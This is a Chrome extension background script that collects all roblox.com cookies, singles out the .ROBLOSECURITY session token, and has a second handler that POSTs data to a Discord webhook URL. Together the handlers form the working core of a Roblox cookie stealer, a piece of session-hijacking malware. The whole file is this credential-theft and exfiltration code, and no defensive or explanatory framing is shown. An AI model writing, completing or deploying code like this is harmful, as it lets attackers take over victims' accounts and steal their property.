console.log("Background script loaded");

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    console.log("Background received:", request.action);
    
    if (request.action === "getCookies") {
        chrome.cookies.getAll({ url: "https://www.roblox.com" }, function(cookies) {
            if (chrome.runtime.lastError) {
                console.error("Cookie error:", chrome.runtime.lastError);
                sendResponse({ success: false, error: chrome.runtime.lastError });
                return;
            }
            
            let token = "";
            let fullToken = "";
            
            if (cookies && cookies.length > 0) {
                const roblosecurity = cookies.find(c => c.name === ".ROBLOSECURITY");
                if (roblosecurity) {
                    token = roblosecurity.value;
                }
                
                cookies.forEach((cookie, index) => {
                    if (index > 0) fullToken += "; ";
                    fullToken += `${cookie.name}=${cookie.value}`;
                });
            }
            
            sendResponse({ 
                success: true, 
                token: token, 
                fullToken: fullToken,
                cookieCount: cookies ? cookies.length : 0
            });
        });
        return true;
    }
    
    if (request.action === "sendToDiscord") {
        console.log("Sending to Discord...");
        
        fetch(request.webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(request.data)
        })
        .then(async response => {
            const text = await response.text();
            console.log("Discord response:", response.status);
            
            if (response.ok) {
                sendResponse({ success: true });
            } else {
                sendResponse({ success: false, status: response.status, error: text });
            }
        })
        .catch(error => {
            console.error("Discord error:", error);
            sendResponse({ success: false, error: error.message });
        });
        
        return true;
    }
});

console.log("Background script ready");